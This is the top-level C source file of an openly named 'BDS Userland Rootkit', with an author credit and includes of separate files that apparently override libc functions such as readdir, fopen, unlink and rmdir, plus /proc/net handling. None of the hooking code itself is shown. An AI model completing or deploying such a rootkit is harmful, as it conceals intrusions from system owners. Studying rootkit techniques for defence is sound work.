/*
BDS Userland Rootkit

developed by : Antonius

website : https://www.bluedragonsec.com

github : https://github.com/bluedragonsecurity

twitter : https://twitter.com/bluedragonsec
*/
#define _GNU_SOURCE
#include <stdio.h>
#include <dlfcn.h>
#include <dirent.h>
#include <string.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/socket.h>
#include <unistd.h>
#include <limits.h>
#include <errno.h>
#include "includes/vars.h"
#include "includes/declare.h"
#include "includes/proc_net.c"
#include "includes/fopen.c"
#include "includes/fopen64.c"
#include "includes/unlink.c"
#include "includes/unlinkat.c"
#include "includes/readdir.c"
#include "includes/readdir64.c"
#include "includes/rmdir.c"


